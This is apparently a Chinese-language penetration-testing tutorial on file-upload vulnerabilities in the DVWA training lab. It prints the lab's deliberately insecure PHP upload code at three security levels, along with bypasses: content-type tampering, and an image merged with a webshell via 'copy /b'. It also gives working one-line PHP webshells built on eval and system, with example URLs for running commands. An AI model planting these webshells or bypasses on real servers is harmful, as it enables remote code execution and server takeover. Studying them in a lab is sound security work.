---
title: 文件上传漏洞
date: 2021-01-25 16:27:00
categories:
- [Kali从入门到入狱, OWASP安全渗透实战]
tags: Kali
---

# 文件上传漏洞

1. 文件上传( File Upload )是大部分web应用都具备的功能，例如用户上传附件、修改头像、分享图片/视频等

2. 正常的文件一般是文档、图片、视频等，web应用收集之后放入后台存储，需要的时候再调用出来返回

3. 如果恶意文件如PHP、ASP等执行文件绕过web应用，并顺利执行，则相当于黑客直接拿到了Webshell

4. 一旦黑客拿到Webshell，则可以拿到web应用的数据，删除web文件，本地提权，进一步拿下整个服务器甚至内网

5. SQL注入攻击的对象是数据库服务，文件上传漏洞主要攻击web服务，实际渗透两种相结合，达到对目标的深度控制

## File Upload

### Security Level：Low

#### File Upload Source

```php
<?php
	if (isset($_POST['Upload'])) {
		$target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/";
		$target_path = $target_path . basename( $_FILES['uploaded']['name']);

		if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {

			echo '<pre>';
			echo 'Your image was not uploaded.';
			echo '</pre>';

		} else {

			echo '<pre>';
			echo $target_path . ' succesfully uploaded!';
			echo '</pre>';

		}
	}
?> 
```

后端代码显示，没有对上传文件进行过滤，只要有上传文件就能上传成功

### Security Level：Medium

#### File Upload Source

```php
<?php
	if (isset($_POST['Upload'])) {
		$target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/";
		$target_path = $target_path . basename($_FILES['uploaded']['name']);
		$uploaded_name = $_FILES['uploaded']['name'];
		$uploaded_type = $_FILES['uploaded']['type'];
		$uploaded_size = $_FILES['uploaded']['size'];

		if (($uploaded_type == "image/jpeg") && ($uploaded_size < 100000)){
			if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {

				echo '<pre>';
				echo 'Your image was not uploaded.';
				echo '</pre>';

			} else {

				echo '<pre>';
				echo $target_path . ' succesfully uploaded!';
				echo '</pre>';

			}
		}else{
			echo '<pre>Your image was not uploaded.</pre>';
		}
	}
?> 
```

后端代码显示上传文件类型必须为`image/jpeg`，并且上传文件大小必须小于100000字节，约等于97.65625kb

#### 文件上传绕过

使用Burpsuite抓包软件拦截上传文件，对上传文件的类型信息作修改

![burpsuite](https://i.vgy.me/o1yHL6.png)

![burpsuite-modify-content-type](https://i.vgy.me/GhuaYR.png)

#### 使用中国菜刀连接网站

![Cknie-connect](https://i.vgy.me/yPcLCv.png)

![Cknife-succeed](https://i.vgy.me/U1svWC.png)

### Security Level：High

#### File Upload Source

```php
<?php
    if (isset($_POST['Upload'])) {
        $target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/";
        $target_path = $target_path . basename($_FILES['uploaded']['name']);
        $uploaded_name = $_FILES['uploaded']['name'];
        $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, '.') + 1);
        $uploaded_size = $_FILES['uploaded']['size'];

        if (($uploaded_ext == "jpg" || $uploaded_ext == "JPG" || $uploaded_ext == "jpeg" || $uploaded_ext == "JPEG") && ($uploaded_size < 100000)){

            if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {

                echo '<pre>';
                echo 'Your image was not uploaded.';
                echo '</pre>';

            } else {

                echo '<pre>';
                echo $target_path . ' succesfully uploaded!';
                echo '</pre>';

            }
        }else{

            echo '<pre>';
            echo 'Your image was not uploaded.';
            echo '</pre>';

        }
    }
?> 
```

后端代码显示上传文件的后缀必须为`jpg、JPG、jpeg、JPEG`，且文件大小不超过100000字节，此时修改文件类型信息已无用

#### 上传图片马绕过检测

```php
# Webshell.php文件编写内容
<?fputs(fopen("shell0.php", "w"), "<?php @eval($_POST['chopper']); ?>")?>
```

```shell
# Windows命令
copy cat.jpg /b + Webshell.php /a cat0.jpg
```

或者使用`edjpgcom`工具将图片和木马合成，成功上传之后需配合文件包含漏洞使用

## Webshell

- 小马：一句话木马也称为小马，即整个shell代码量只有一行，一般是系统执行函数
- 大马：代码量和功能比小马多，一般会进行二次编码加密，防止被防火墙/入侵系统检测到

### shell1.php

```php
# eval 使用PHP函数,如phpinfo();
<?php @eval($_REQUEST['cmd']); ?>
```

**使用：**`http://192.168.111.18/dvwa/hackable/uploads/shell1.php?cmd=phpinfo();`

### shell2.php

```php
# system 使用Linux系统命令,如ls,cp,rm
<?php system($_REQUEST['ppx']); ?>
```

使用：`http://192.168.111.18/dvwa/hackable/uploads/shell2.php?ppx=id`

查看哪个用户运行的apache

`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

### 中国菜刀

```php
<?php @eval($_POST['chopper']); ?>
# or more simple
<?php eval($_POST[1]); ?>
```

:::info

注：REQUEST是在网页端输入变量访问，POST则是使用中国菜刀之类的工具连接,是 C / S 架构

:::